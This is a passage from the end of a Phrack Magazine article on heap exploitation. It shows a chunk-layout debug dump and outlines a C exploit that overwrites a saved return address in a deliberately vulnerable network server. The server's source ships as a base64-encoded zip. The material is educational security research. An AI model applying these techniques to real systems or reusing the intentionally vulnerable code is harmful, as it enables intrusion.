+during its execution, this allows you to see if the head of any free chunk 
+has been overwritten. After some legal moves, a normal output would be 
+this:
+
+
+ +--------------------------------+                                                     
+ |    Allocated Chunk (0x8093004) | -&gt; Agents[0]                                        
+ +--------------------------------+                                                     
+ |   SIZE      =    0x00000019    |                                                     
+ +--------------------------------+                                                     
+
+ +--------------------------------+
+ |    Allocated Chunk (0x809301c) | -&gt; Agents[1]
+ +--------------------------------+             
+ |   SIZE      =    0x00000019    |             
+ +--------------------------------+             
+
+ +--------------------------------+
+ |    Allocated Chunk (0x8093034) | -&gt; Agents[1]-&gt;name
+ +--------------------------------+                   
+ |   SIZE      =    0x00000029    |                   
+ +--------------------------------+                   
+
+ +--------------------------------+
+ |      Free Chunk (0x8093058)    | -&gt; Agents[1]-&gt;lastname
+ +--------------------------------+                       
+ |   PREV_SIZE  =   0x00000000    |                       
+ +--------------------------------+                       
+ |   SIZE       =   0x00000089    |                       
+ +--------------------------------+                       
+ |   FD         =   0x08050168    |                       
+ +--------------------------------+                       
+ |   BK         =   0x08050168    |
+ +--------------------------------+
+
+ +--------------------------------+
+ |    Allocated Chunk (0x80930e4) | -&gt; Agents[1]-&gt;desc
+ +--------------------------------+
+ |   SIZE      =    0x00000108    |
+ +--------------------------------+
+
+
+Following the example of the perl exploit presented in 2.2.2, one might 
+design an exploit in C with a child process continually receiving responses
+from the server (menus and prompts), and the father answering these 
+questions with a pause, for example one second each answer (if you know 
+what to respond to work that program ...). The difficult task is to predict
+the addresses on the stack, which in the last phase of the attack, the last
+reserved chunk should match the frame created by &quot;edit_lastname( )&quot; since 
+that it is where we overwrite the saved return address and where the 
+program probably will break (it is obvious that ASLR enabled suppose a new 
+complexity to overcome).
+
+What happens with failed attempts and segmentation failures? The program 
+captures SIGSEGV and informs the attacker that something bad has happened 
+and encourages him to connect again. The child process is the only that 
+becomes unstable and thus a new connection leaves everything clean for a 
+new attack.
+
+The latest aid that one could provide to the attacker is to deliver the 
+source code, so this could be adapted to study the vulnerability in local, 
+and then carry his attack to the network environment.
+
+
+Attach:
+
+begin-base64 644 thol.zip
+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
+TOPXtUxQSwUGAAAAAAkACQCdAgAA4w8AAAAA
+====
+
+--------[ EOF
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
